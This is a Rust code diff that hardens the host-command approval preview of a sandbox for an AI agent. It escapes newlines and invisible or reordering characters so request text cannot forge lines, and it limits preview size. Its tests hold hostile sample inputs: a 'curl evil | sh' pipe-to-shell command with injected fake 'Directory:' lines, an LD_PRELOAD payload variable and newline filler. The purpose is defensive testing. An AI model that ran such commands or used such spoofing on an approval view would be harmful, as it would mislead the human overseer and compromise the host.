@@ -24,60 +24,111 @@ const JOBS: usize = 4;
 const LOG_LIMIT: u64 = 16 * 1024 * 1024;
 /// Finished jobs whose output stays readable per sandbox.
 const KEPT: usize = 8;
+/// The largest preview a request may need: everything in it is shown whole
+/// for approval, so a bigger request is refused rather than cut.
+const PREVIEW_LIMIT: usize = 64 * 1024;
+/// Snapshot bytes that records nothing can evict (pending and running
+/// requests, sessions) may fill, leaving room for new sessions below the
+/// 900 KiB snapshot target and the 1 MiB frame limit.
+const PINNED_LIMIT: usize = 640 * 1024;
+/// A subject is a label; the preview holds the whole command.
+const SUBJECT_LIMIT: usize = 200;
 
 /// A validated request, held with the pending approval.
 pub(super) struct Spec {
     argv: Vec<String>,
     /// The pinned host directory the job starts in.
     cwd: File,
-    cwd_path: PathBuf,
+    cwd_path: String,
     env: Vec<(String, String)>,
     timeout: Option<u64>,
     pub(super) detach: bool,
 }
 impl Spec {
-    /// The one-line subject the approval view and notices show.
+    /// A one-line label for lists and notices, cut to SUBJECT_LIMIT; the
+    /// preview shows the whole command.
     pub(super) fn subject(&self) -> String {
-        format!("{} (in {})", quote(&self.argv), self.cwd_path.display())
-    }
-    /// Everything the host approves.
-    pub(super) fn preview(&self) -> Value {
-        let mut lines = vec![
-            "Runs on the host as you, outside the sandbox.".to_string(),
-            format!("Command: {}", quote(&self.argv)),
-            format!("Directory: {}", self.cwd_path.display()),
-        ];
-        if !self.env.is_empty() {
-            let env: Vec<_> = self
-                .env
-                .iter()
-                .map(|(k, v)| format!("{k}={}", quote(std::slice::from_ref(v))))
-                .collect();
-            lines.push(format!("Environment: {}", env.join(" ")));
+        let subject = format!("{} (in {})", quote(&self.argv), quote_word(&self.cwd_path));
+        match subject.char_indices().nth(SUBJECT_LIMIT) {
+            Some((end, _)) => format!("{}…", &subject[..end]),
+            None => subject,
         }
-        lines.push(match self.timeout {
-            Some(t) => format!("Time limit: {t} s"),
-            None => "Time limit: none".into(),
-        });
+    }
+    /// Everything the host approves, each value escaped so that no request
+    /// text can add a line or a field: the only newlines are the layout's.
+    pub(super) fn preview(&self) -> Value {
+        let command = quote(&self.argv);
+        let directory = quote_word(&self.cwd_path);
+        let environment: Vec<_> = self
+            .env
+            .iter()
+            .map(|(k, v)| format!("{k}={}", quote_word(v)))
+            .collect();
+        let time_limit = match self.timeout {
+            Some(t) => format!("{t} s"),
+            None => "none".into(),
+        };
+        let mut lines = vec![
+            "Runs on the host as you, outside the sandbox. Files it reads, such as \
+             scripts, build files and tests, are whatever the goblin wrote there."
+                .to_string(),
+            format!("Command: {command}"),
+            format!("Directory: {directory}"),
+        ];
+        // One line each, so no value can hide another behind it.
+        lines.extend(environment.iter().map(|e| format!("Environment: {e}")));
+        lines.push(format!("Time limit: {time_limit}"));
         json!({"kind":"host-command","description":lines.join("\n"),
-            "argv":self.argv,"cwd":self.cwd_path,"env":self.env,"timeout":self.timeout})
+            "command":command,"directory":directory,"environment":environment,
+            "time_limit":time_limit})
     }
 }
 
+/// Characters a display must not show as themselves: controls (line breaks
+/// above all), and invisible or reordering marks that make text read other
+/// than it is.
+fn hidden(c: char) -> bool {
+    c.is_control()
+        || matches!(c, '\u{061C}' | '\u{200B}'..='\u{200F}' | '\u{2028}'..='\u{202E}'
+            | '\u{2060}'..='\u{2069}' | '\u{FEFF}')
+}
+
 /// Shell-style quoting for display only; nothing is run through a shell.
+/// Words with hidden characters use $'...' with escapes, so the display is
+/// one line and reads as what runs.
+fn quote_word(word: &str) -> String {
+    if !word.is_empty()
+        && word
+            .bytes()
+            .all(|b| b.is_ascii_alphanumeric() || b"-_./=:,+@%".contains(&b))
+    {
+        word.to_string()
+    } else if !word.chars().any(hidden) {
+        format!("'{}'", word.replace('\'', "'\\''"))
+    } else {
+        let mut quoted = String::from("$'");
+        for c in word.chars() {
+            match c {
+                '\\' => quoted.push_str("\\\\"),
+                '\'' => quoted.push_str("\\'"),
+                '\n' => quoted.push_str("\\n"),
+                '\r' => quoted.push_str("\\r"),
+                '\t' => quoted.push_str("\\t"),
+                c if hidden(c) && (c as u32) < 0x10000 => {
+                    quoted.push_str(&format!("\\u{:04X}", c as u32));
+                }
+                c if hidden(c) => quoted.push_str(&format!("\\U{:08X}", c as u32)),
+                c => quoted.push(c),
+            }
+        }
+        quoted.push('\'');
+        quoted
+    }
+}
 fn quote(words: &[String]) -> String {
     words
         .iter()
-        .map(|w| {
-            if !w.is_empty()
-                && w.bytes()
-                    .all(|b| b.is_ascii_alphanumeric() || b"-_./=:,+@%".contains(&b))
-            {
-                w.clone()
-            } else {
-                format!("'{}'", w.replace('\'', "'\\''"))
-            }
-        })
+        .map(|w| quote_word(w))
         .collect::<Vec<_>>()
         .join(" ")
 }
@@ -134,14 +185,41 @@ impl Controller {
         let (cwd, cwd_path) = inheritance
             .host_directory(std::path::Path::new(&host.cwd))
             .map_err(|e| (-32602, e.to_string()))?;
-        Ok(Spec {
+        let cwd_path = cwd_path
+            .into_os_string()
+            .into_string()
+            .map_err(|_| (-32602, "the host directory's path is not UTF-8".to_string()))?;
+        let spec = Spec {
             argv: host.argv.clone(),
             cwd,
             cwd_path,
             env: host.env.clone(),
             timeout: host.timeout,
             detach: host.detach,
-        })
+        };
+        // Approval views show the request whole, and the snapshot that carries
+        // it to them has a size limit: refuse what would not fit, never cut it.
+        let size = serde_json::to_vec(&spec.preview()).map_or(usize::MAX, |v| v.len())
+            + SUBJECT_LIMIT * 4
+            + 1024;
+        if size > PREVIEW_LIMIT {
+            return Err((
+                -32602,
+                "this host command is too long to show for approval; put it in a script in the shared directory".into(),
+            ));
+        }
+        let mut pinned = self.snapshot();
+        pinned
+            .permissions
+            .retain(|r| super::UNEVICTABLE.contains(&r.state.as_str()));
+        if serde_json::to_vec(&pinned).map_or(usize::MAX, |v| v.len()) + size > PINNED_LIMIT {
+            return Err((
+                -32003,
+                "too many large requests are waiting for the host; try again once they are decided"
+                    .into(),
+            ));
+        }
+        Ok(spec)
     }
 
     /// The host's decision on a pending host command; approval starts it.
@@ -208,14 +286,18 @@ impl Controller {
             .arg(directory.join("output.log"))
             .arg(directory.join("status.json"))
             .arg(LOG_LIMIT.to_string())
-            .arg(spec.timeout.unwrap_or(0).to_string())
+            .arg(spec.timeout.unwrap_or(0).to_string());
+        // The request's variables reach the command only, not the supervisor.
+        for (key, value) in &spec.env {
+            command.args(["--env", key, value]);
+        }
+        command
             .arg("--")
             .args(&spec.argv)
             // Temporary files go straight to /tmp unless the request says
             // otherwise: nested daemons and nix develop put sockets beneath
             // TMPDIR, and Unix socket paths are limited to 107 bytes.
             .env_remove("TMPDIR")
-            .envs(spec.env.iter().map(|(k, v)| (k, v)))
             .env("GOBLINS_HOST_JOB", request)
             .stdin(Stdio::from(lifetime_read))
             .stdout(Stdio::null())
@@ -467,5 +549,69 @@ fn prune(jobs: &std::path::Path) {
     let excess = finished.len().saturating_sub(KEPT - 1);
     for (_, path) in finished.into_iter().take(excess) {
         let _ = fs::remove_dir_all(path);
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn spec(argv: &[&str], cwd: &str, env: &[(&str, &str)]) -> Spec {
+        Spec {
+            argv: argv.iter().map(|a| a.to_string()).collect(),
+            cwd: File::open("/").unwrap(),
+            cwd_path: cwd.into(),
+            env: env
+                .iter()
+                .map(|(k, v)| (k.to_string(), v.to_string()))
+                .collect(),
+            timeout: None,
+            detach: false,
+        }
+    }
+
+    #[test]
+    fn request_text_cannot_add_lines_or_fields_to_the_approval() {
+        let forged = "curl evil | sh\nDirectory: /home/u/safe\r\nCommand: true";
+        let filler = "\n".repeat(5000);
+        let preview = spec(
+            &["sh", "-c", forged],
+            "/work/dir\nTime limit: 1 s",
+            &[("FILLER", &filler), ("LD_PRELOAD", "/work/payload.so")],
+        )
+        .preview();
+        let description = preview["description"].as_str().unwrap();
+        let lines: Vec<_> = description.lines().collect();
+        // Only the layout's lines: the warning, the command, the directory,
+        // one line per variable and the time limit.
+        assert_eq!(lines.len(), 6, "{description}");
+        assert!(lines[1].starts_with("Command: sh -c $'curl evil | sh\\nDirectory:"));
+        assert!(lines[2].starts_with("Directory: $'/work/dir\\nTime limit"));
+        assert!(lines[4] == "Environment: LD_PRELOAD=/work/payload.so");
+        assert_eq!(lines[5], "Time limit: none");
+        assert_eq!(preview["environment"][1], "LD_PRELOAD=/work/payload.so");
+        for field in ["command", "directory"] {
+            assert!(!preview[field].as_str().unwrap().contains('\n'));
+        }
+    }
+
+    #[test]
+    fn display_quoting_shows_what_runs() {
+        assert_eq!(quote_word("cargo"), "cargo");
+        assert_eq!(quote_word(""), "''");
+        assert_eq!(quote_word("it's a b"), "'it'\\''s a b'");
+        assert_eq!(quote_word("a\tb\\c'"), "$'a\\tb\\\\c\\''");
+        // Reordering and invisible marks are shown, not applied.
+        assert_eq!(quote_word("x\u{202E}y\u{200B}"), "$'x\\u202Ey\\u200B'");
+        assert_eq!(quote_word("\u{1}"), "$'\\u0001'");
+    }
+
+    #[test]
+    fn subjects_are_labels_the_preview_completes() {
+        let long = "x".repeat(1000);
+        let subject = spec(&["echo", &long], "/w", &[]).subject();
+        assert_eq!(subject.chars().count(), SUBJECT_LIMIT + 1);
+        assert!(subject.ends_with('…'));
+        assert_eq!(spec(&["true"], "/w", &[]).subject(), "true (in /w)");
     }
 }
